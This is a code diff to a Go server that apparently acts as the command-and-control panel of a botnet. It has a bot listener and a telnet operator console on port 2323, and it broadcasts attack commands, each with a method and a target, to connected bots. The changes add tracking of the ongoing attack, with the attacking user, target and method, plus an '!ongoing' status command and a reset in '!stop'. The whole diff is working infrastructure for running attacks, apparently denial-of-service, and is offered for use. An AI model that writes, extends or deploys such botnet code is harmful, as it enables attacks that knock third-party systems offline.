@@ -43,6 +43,12 @@ var (
 
 	attackEndTime time.Time
 	attackMutex   sync.Mutex
+
+	ongoing_target = ""
+	ongoing_time   = 0
+	ongoing_method = ""
+	attackTimer    *time.Timer
+	attacking_user = ""
 )
 
 func main() {
@@ -54,7 +60,6 @@ func main() {
 
 	fmt.Println("[server.go] bot listener started")
 	fmt.Println("[server.go] telnet listener started on port: 2323")
-
 	go handleCommands()
 
 	go startTelnetServer()
@@ -163,8 +168,9 @@ func handleCommands() {
 			continue
 		}
 
-		if cmd == "!getinfo" {
-
+		if cmd == "!ongoing" {
+			printOngoingAttacks(os.Stdout)
+			continue
 		}
 
 		if cmd == "!stats" {
@@ -262,6 +268,27 @@ func printBotsStatus(writer io.Writer) {
 func handleBroadcastReboot() {
 	broadcastCommand("reboot")
 	fmt.Println("REBOOTED")
+}
+
+func printOngoingAttacks(writer io.Writer) {
+	attackMutex.Lock()
+	defer attackMutex.Unlock()
+
+	if ongoingAttacks == 0 || time.Now().After(attackEndTime) {
+		writer.Write([]byte("No ongoing attacks.\r\n"))
+		return
+	}
+
+	header := fmt.Sprintf("\r\n  #   %-10s   %-15s   %-8s\r\n", "Username", "Target", "Method")
+	separator := fmt.Sprintf(" --- ---------- --------------- --------\r\n")
+
+	writer.Write([]byte(header))
+	writer.Write([]byte(separator))
+
+	row := fmt.Sprintf("  1   %-10s   %-15s   %-8s\r\n",
+		attacking_user, ongoing_target, ongoing_method)
+
+	writer.Write([]byte(row))
 }
 
 func printStats(writer io.Writer) {
@@ -527,6 +554,12 @@ func handleTelnetClient(conn net.Conn) {
 			continue
 		}
 
+		if cmd == "ongoing" || cmd == "!ongoing" {
+			conn.Write([]byte("\n"))
+			printOngoingAttacks(conn)
+			continue
+		}
+
 		if strings.HasPrefix(cmd, "!getinfo ") {
 			parts := strings.Fields(cmd)
 			if len(parts) >= 2 {
@@ -564,6 +597,14 @@ func handleTelnetClient(conn net.Conn) {
 			if parts[0] == "!stop" {
 				attackMutex.Lock()
 				attackEndTime = time.Time{}
+				if attackTimer != nil {
+					attackTimer.Stop()
+				}
+				ongoingAttacks = 0
+				ongoing_target = ""
+				ongoing_method = ""
+				attacking_user = ""
+				ongoing_time = 0
 				attackMutex.Unlock()
 
 				conn.Write([]byte(fmt.Sprintf("%sSuccessfully stopped all attacks.%s\r", colorPink, colorReset)))
@@ -621,9 +662,14 @@ func handleTelnetClient(conn net.Conn) {
 				continue
 			}
 
-			response := fmt.Sprintf("%sBroadcasted command to %d bots!%s\r", colorMint, botCount, colorReset)
+			// set ongoing attack vector
+			attackMutex.Lock()
+			ongoing_target = parts[1]
+			ongoing_method = parts[0]
+			attacking_user = username
+			ongoingAttacks = 1
+			response := fmt.Sprintf("%sAttack started!%s\r\n", colorPink, colorReset)
 			conn.Write([]byte(response))
-			ongoingAttacks++
 			broadcastCommand(cmd)
 			continue
 		}
